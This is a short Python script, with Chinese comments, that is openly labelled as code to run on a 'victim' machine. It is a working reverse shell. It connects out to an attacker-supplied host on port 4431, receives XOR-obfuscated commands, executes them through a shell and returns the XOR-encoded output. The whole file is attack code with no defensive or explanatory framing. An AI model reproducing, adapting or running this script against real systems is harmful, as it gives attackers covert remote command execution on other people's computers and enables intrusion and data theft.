#在victim上运行,作为客户接受数据
import socket,subprocess,sys

RHOST = sys.argv[1]
RPORT = 4431
with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
	s.connect((RHOST,RPORT))
	while True:
		# 从socket中接收XOR编码的数据
		data = s.recv(1024)
		en_data = bytearray(data)
		for i in range(len(en_data)):
			en_data[i] ^= 0x41
		
		# 执行解码命令，subprocess模块能够通过PIPE STDOUT/STDERR/STDIN把值赋值给一个变量
		proc = subprocess.Popen(en_data.decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		try:
			# 等待子进程结束
			proc.wait(timeout=10)
			STDOUT, STDERR = proc.communicate()
		except:
			proc.kill()
			STDOUT = b''
			STDERR = b"[ERROR] Process do not terminate"

		# 输出编码后的数据并且发送给指定的主机RHOST
		en_STDOUT = bytearray(STDOUT+STDERR)
		if not en_STDOUT:
			en_STDOUT = bytearray(b'\n')

		for i in range(len(en_STDOUT)):
			en_STDOUT[i] ^= 0x41
		s.sendall(en_STDOUT)